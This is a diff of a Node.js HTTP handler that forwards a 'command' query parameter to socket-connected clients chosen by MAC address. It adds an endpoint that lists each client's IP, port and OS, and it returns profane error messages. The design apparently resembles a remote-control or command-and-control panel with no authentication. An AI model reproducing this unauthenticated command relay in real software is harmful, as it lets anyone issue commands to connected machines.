@@ -75,18 +75,34 @@ socketServer.listen(8080);
 const httpServer = http.createServer((req, res) => {
     res.writeHead(200, {'Content-Type': 'text/plain'});
     let query = url.parse(req.url, true).query;
-    if (query != null && typeof query['mac'] !== "undefined") {
-        if (clients[query['mac']] !== undefined) {
-            if (typeof query['command'] !== "undefined") {
-                clients[query['mac']].setCommand(query['command'], result => res.end(result));
+    if (query != null) {
+        if (typeof query['mac'] !== "undefined") {
+            if (clients[query['mac']] !== undefined) {
+                if (typeof query['command'] !== "undefined") {
+                    clients[query['mac']].setCommand(query['command'], result => res.end(result));
+                } else {
+                    res.end("Unknown operation");
+                }
             } else {
-                res.end("Unknown operation");
+                res.end('Such mac is not connected');
             }
+        } else if (typeof query['clients'] !== "undefined") {
+            let obj = [];
+            for (let mac in clients) {
+                if (clients.hasOwnProperty(mac))
+                    obj.push({
+                        mac: mac,
+                        ip: clients[mac].ip,
+                        port: clients[mac].port,
+                        os: clients[mac].os,
+                    });
+            }
+            res.end(JSON.stringify(obj));
         } else {
-            res.end('Such mac is not connected');
+            res.end("fuck you");
         }
     } else {
-        res.end("fuck you");
+        res.end("wtf");
     }
 });
 
